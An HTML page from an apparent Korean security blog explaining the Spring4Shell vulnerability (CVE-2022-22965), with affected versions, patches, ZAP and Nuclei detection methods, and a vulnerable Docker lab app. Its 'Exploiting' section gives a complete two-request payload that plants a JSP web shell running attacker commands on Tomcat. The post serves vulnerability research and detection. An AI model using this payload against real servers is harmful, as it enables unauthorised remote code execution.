@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>Spring4Shell RCE 취약점 (CVE-2022-22965) | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="Spring4Shell RCE 취약점 (CVE-2022-22965)">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2022/spring4shell/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Spring4Shell RCE 취약점 (CVE-2022-22965)">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2022/spring4shell/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Spring4Shell RCE 취약점 (CVE-2022-22965)","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2022/spring4shell/","datePublished":"2022-04-05T00:00:00+00:00","dateModified":"2022-04-05T00:00:00+00:00","image":"https://user-images.githubusercontent.com/13212227/161727541-1e7d85fc-c5d1-4ab6-acfe-a9bd4caeb68f.jpg"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2022/"},{"@type":"ListItem","position":5,"name":"Spring4Shell RCE 취약점 (CVE-2022-22965)"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">Spring4Shell RCE 취약점 (CVE-2022-22965)</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2022-04-05">
+                        APRIL 5, 2022
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>지난 주 Spring4Shell 취약점으로 인해 인터넷이 또 <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2021/12/11/log4shell-internet-is-on-fire/">불탈 뻔</a> 했습니다. 다행히 Log4Shell 보단 재현하기 어렵다는 문제로 무난하게 지나갔는데요. 겸사겸사 좀 늦었지만 이슈 정리해서 글로 올려볼까 합니다.</p>
+<h2 id="spring4shell">Spring4Shell</h2>
+<p>JDK 9버전 이상의 Spring Core에서 RCE(Remote Code Execution)이 가능한 취약점입니다. 공개 당시 0-day 상태였고, 이후 CVE-2022-22965 할당 및 패치가 공개되었습니다. 별거 아니다, 심각한거다 이야기가 많았는데 결국 CVSS 9.8을 받았네요.</p>
+<h3 id="문제점">문제점</h3>
+<p>JDK 9+에서 Spring MVC나 Spring WebFlux가 구동중이고, Endpoint에 Data binder가 enabled 된 경우에 Request에 포함된 공격코드를 Binding 하면서 공격자가 의도한 로직이 실행됩니다. Data binder에서 class를 의미하는 string 값은 binding 하지 못하도록 제한되어야 하는데, 이 부분에 결함이 있었던 것 같습니다.</p>
+<h3 id="공격의-한계">공격의 한계</h3>
+<p>알려진 내용으로는 Exploit이 war 파일로 배포되는 경우에 영향을 받는다고 합니다. Spring boot가 기본적으로 jar를 통한 배포를 사용하기 때문에 생각보다 파급력이 크지는 않았습니다. 다만 악용하는 방법이 다 공개된 것도 아닐테고, 리스크는 여전히 존재하니 가급적이면 패치하는게 좋습니다.</p>
+<h3 id="취약-버전">취약 버전</h3>
+<ul>
+<li>Spring framework 5.3.0 - 5.3.17</li>
+<li>Spring framework 5.2.0 - 5.2.19</li>
+<li>및 구버전</li>
+</ul>
+<h3 id="패치-버전">패치 버전</h3>
+<ul>
+<li>Spring framework 5.3.18+, 5.2.2+</li>
+<li>Spring boot 2.5.12, 2.6.6</li>
+</ul>
+<h2 id="how-to-detect">How to detect</h2>
+<h3 id="zap">ZAP</h3>
+<p>ActiveScan Rule Alpha 37.0 버전에 반영되었습니다. Alpha Rule을 사용하신다면 모든 Node에 대해 class.module.classLoader.DefaultAssertionStatus=nonsense Query를 붙여 400 Bad Request를 탐지합니다.</p>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/161726523-61b26dbe-4825-463e-85f8-026629d589c9.png" alt="" /></p>
+<h3 id="nuclei">Nuclei</h3>
+<p>nuclei template의 경우 class.module.classLoader.resources.context.configFile 을 이용하여 OAST 요청을 유도합니다.</p>
+<pre><code class="language-yaml hljs"><span class="hljs-name">id</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">CVE-2022-22965</span>
+
+<span class="hljs-name">info</span><span class="hljs-punctuation">:</span>
+  <span class="hljs-name">name</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">Spring Framework RCE via Data Binding on JDK 9+ (Spring4Shell)</span>
+  <span class="hljs-name">author</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">justmumu,arall,dhiyaneshDK,akincibor</span>
+  <span class="hljs-name">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">critical</span>
+  <span class="hljs-name">description</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.</span>
+  <span class="hljs-name">remediation</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5.3</span><span class="hljs-literal">.x users should upgrade to 5.3.18+, 5.2.x users should upgrade to 5.2.20+.</span>
+  <span class="hljs-name">reference</span><span class="hljs-punctuation">:</span>
+    - <span class="hljs-literal">https://tanzu.vmware.com/security/cve-2022-22965</span>
+    - <span class="hljs-literal">https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/</span>
+    - <span class="hljs-literal">https://twitter.com/RandoriAttack/status/1509298490106593283</span>
+    - <span class="hljs-literal">https://mp.weixin.qq.com/s/kgw-O4Hsd9r2vfme3Y2Ynw</span>
+    - <span class="hljs-literal">https://twitter.com/_0xf4n9x_/status/1509935429365100546</span>
+  <span class="hljs-name">classification</span><span class="hljs-punctuation">:</span>
+    <span class="hljs-name">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span>
+    <span class="hljs-name">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-number">9.8</span>
+    <span class="hljs-name">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">CVE-2022-22965</span>
+    <span class="hljs-name">cwe-id</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">CWE-770</span>
+  <span class="hljs-name">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">cve,cve2022,rce,spring,injection,oast</span>
+
+<span class="hljs-name">requests</span><span class="hljs-punctuation">:</span>
+  - <span class="hljs-name">method</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">GET</span>
+    <span class="hljs-name">path</span><span class="hljs-punctuation">:</span>
+      - <span class="hljs-string">&quot;{{BaseURL}}/?class.module.classLoader.resources.context.configFile=https://{{interactsh-url}}&amp;class.module.classLoader.resources.context.configFile.content.aaa=xxx&quot;</span>
+
+    <span class="hljs-name">headers</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-name">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">application/x-www-form-urlencoded</span>
+
+    <span class="hljs-name">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">and</span>
+    <span class="hljs-name">matchers</span><span class="hljs-punctuation">:</span>
+      - <span class="hljs-name">type</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">word</span>
+        <span class="hljs-name">part</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">interactsh_protocol</span> <span class="hljs-comment"># Confirms the HTTP Interaction</span>
+        <span class="hljs-name">words</span><span class="hljs-punctuation">:</span>
+          - <span class="hljs-string">&quot;http&quot;</span>
+
+      - <span class="hljs-name">type</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">word</span>
+        <span class="hljs-name">part</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">interactsh_request</span>
+        <span class="hljs-name">words</span><span class="hljs-punctuation">:</span>
+          - <span class="hljs-string">&quot;User-Agent: Java&quot;</span>
+        <span class="hljs-name">case-insensitive</span><span class="hljs-punctuation">:</span> <span class="hljs-literal">true</span>
+</code></pre>
+<p><a href="https://github.com/projectdiscovery/nuclei-templates/blob/6020f5f7e74135970bc283317cc303fc6597b1e5/cves/2022/CVE-2022-22965.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/6020f5f7e74135970bc283317cc303fc6597b1e5/cves/2022/CVE-2022-22965.yaml</a></p>
+<h3 id="raw-request">Raw Request</h3>
+<h4 id="error-base">Error Base</h4>
+<p>Request</p>
+<pre><code>GET /?class.module.classLoader.DefaultAssertionStatus=nonsense HTTP/1.1
+Host: localhost
+</code></pre>
+<p>Response</p>
+<pre><code>HTTP/1.1 400
+Content-Type: application/json
+Connection: close
+</code></pre>
+<h4 id="oast-base">OAST Base</h4>
+<p>Request</p>
+<pre><code>GET /?class.module.classLoader.resources.context.configFile=http://&lt;OAST&gt;&amp;class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1 HTTP/1.1
+Host: localhost
+</code></pre>
+<p>OAST Reaction</p>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/161726562-3c4a5452-b178-4be6-bf1b-b74897d32bc0.png" alt="" /></p>
+<h2 id="exploiting">Exploiting</h2>
+<p>First Request</p>
+<pre><code>POST / HTTP/1.1
+Host: localhost
+suffix: %&gt;//
+c1: Runtime
+c2: &lt;%
+
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22password%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+</code></pre>
+<p>Second Request</p>
+<pre><code>GET /tomcatwar.jsp?pwd=password&amp;cmd=&lt;YOUR-COMMAND&gt; HTTP/1.1
+Host: localhost
+</code></pre>
+<h2 id="sample-app">Sample app</h2>
+<pre><code>docker run -p 9090:8080 vulfocus/spring-core-rce-2022-03-29
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement">https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement</a></li>
+<li><a href="https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-alpha/#spring4shell-cve-2022-22965">https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-alpha/#spring4shell-cve-2022-22965</a></li>
+<li>https://github.com/WeiJiLab/Spring4Shell-POC</li>
+<li><a href="https://spring.io/blog/2022/03/31/spring-boot-2-6-6-available-now">https://spring.io/blog/2022/03/31/spring-boot-2-6-6-available-now</a></li>
+</ul>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
